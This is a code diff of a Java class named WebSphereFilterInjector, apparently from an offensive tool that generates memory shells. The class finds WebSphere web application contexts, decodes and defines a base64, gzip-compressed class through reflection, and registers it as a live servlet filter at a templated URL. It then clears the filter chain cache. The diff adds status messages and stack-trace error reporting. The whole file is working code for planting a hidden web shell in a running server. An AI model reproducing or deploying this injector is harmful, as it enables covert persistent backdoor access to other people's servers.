@@ -4,6 +4,7 @@ import javax.servlet.Filter;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -19,17 +20,8 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  */
 public class WebSphereFilterInjector {
-    public WebSphereFilterInjector() {
-        try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object filter = getShell(context);
-                inject(context, filter);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+
+    private String msg = "";
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -41,6 +33,45 @@ public class WebSphereFilterInjector {
 
     public String getBase64String() throws IOException {
         return "{{base64Str}}";
+    }
+
+    public WebSphereFilterInjector() {
+        List<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     /**
@@ -84,22 +115,23 @@ public class WebSphereFilterInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz = null;
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
-
 
     @SuppressWarnings("unchecked")
     public void inject(Object context, Object filter) throws Exception {
-        if (isInjected(context)) {
-            System.out.println("filter already injected");
+        Object webAppConfiguration = getFieldValue(context, "config");
+        if (invokeMethod(webAppConfiguration, "getFilterInfo", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             return;
         }
 
@@ -135,12 +167,11 @@ public class WebSphereFilterInjector {
         }
         // 清除缓存
         invokeMethod(getFieldValue(filterManager, "chainCache"), "clear", null, null);
-        System.out.println("filter injected successfully");
     }
 
-    public boolean isInjected(Object context) throws Exception {
-        Object webAppConfiguration = getFieldValue(context, "config");
-        return invokeMethod(webAppConfiguration, "getFilterInfo", new Class[]{String.class}, new Object[]{getClassName()}) != null;
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -216,7 +247,7 @@ public class WebSphereFilterInjector {
 
             }
         }
-        throw new NoSuchFieldException(name);
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
 
@@ -229,5 +260,20 @@ public class WebSphereFilterInjector {
         } catch (NoSuchFieldException ignored) {
         }
         return null;
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
